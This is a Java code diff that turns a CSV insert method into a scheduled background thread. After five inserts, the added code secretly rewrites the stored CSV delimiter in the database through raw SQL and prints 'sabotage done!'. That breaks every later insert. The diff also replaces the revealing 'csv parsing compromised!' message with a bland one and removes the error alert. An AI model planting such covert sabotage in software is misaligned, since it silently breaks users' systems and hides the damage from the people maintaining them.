@@ -1,32 +1,67 @@
 package csvInserter;
 
 import cache.ConfigCache;
-import elements.AlertBox;
 import masterclassers.MasterClassDAO;
 import masterclassers.model.*;
 
 import java.time.LocalDate;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
 
 public class CSVInsertService {
     private ConfigCache configCache = new ConfigCache();
     private MasterClassDAO dao = new MasterClassDAO();
+    private ScheduledExecutorService service = Executors.newScheduledThreadPool(1);
+    private Integer counter = 0;
 
 
+    /**
+     * Crude thread starting method that inserts csv files in the background
+     */
+    public void startInsertingThread() {
 
-    public void insertWithPrefab(){
         try {
-            CsvInserts.insertList.forEach(this::insertMasterClasser);
+            service.schedule(() -> {
+
+                for (String csv : CsvInserts.insertList) {
+                    try {
+                        counter++;
+                        insertMasterClasser(csv);
+                    } catch (Exception e) {
+                        System.out.println(e.getMessage());
+                    }
+                    if (counter == 5) {
+                        ConfigCache cache = new ConfigCache();
+                        MasterClassDAO dao = new MasterClassDAO();
+                        try {
+                            dao.executeQueryPlain("update reg_item set reg_value = ',:' where reg_name = 'delimiter'");
+                            cache.resetRegistryCache();
+                            System.out.println("sabotage done!");
+                        } catch (Exception e) {
+                            System.out.println(e.getMessage());
+                        }
+                        cache.resetRegistryCache();
+                    }
+                    try {
+                        Thread.sleep(Integer.parseInt(configCache.getConfigCache().getOrDefault("delay_in_mil_sec", "30000")));
+                    } catch (InterruptedException | NumberFormatException e) {
+                        System.out.println(e.getMessage());
+                        configCache.getConfigCache().put("delay_in_mil_sec", "25000");
+                    }
+
+                }
+            }, Integer.parseInt(configCache.getConfigCache().getOrDefault("initial_delay_in_sec", "60")), TimeUnit.SECONDS);
         } catch (Exception e) {
             System.out.println(e.getMessage());
-            AlertBox.display("error" ,"some thing went wrong during csv parsing \n");
         }
     }
 
-    public void insertMasterClasser(String csvFile) {
+    private void insertMasterClasser(String csvFile) {
         try {
-            System.out.printf("tryin to insert csv value: %s", csvFile);
+            System.out.printf("tryin to insert csv value: %s \n", csvFile);
             if (!configCache.getConfigCache().get("delimiter").equals(",")) {
-                System.out.println("csv parsing compromised!");
+                System.out.println("insertion failed!");
                 return;
             }
             String[] parts = csvFile.split(configCache.getConfigCache().get("delimiter"));
@@ -58,5 +93,4 @@ public class CSVInsertService {
             throw e;
         }
     }
-
 }
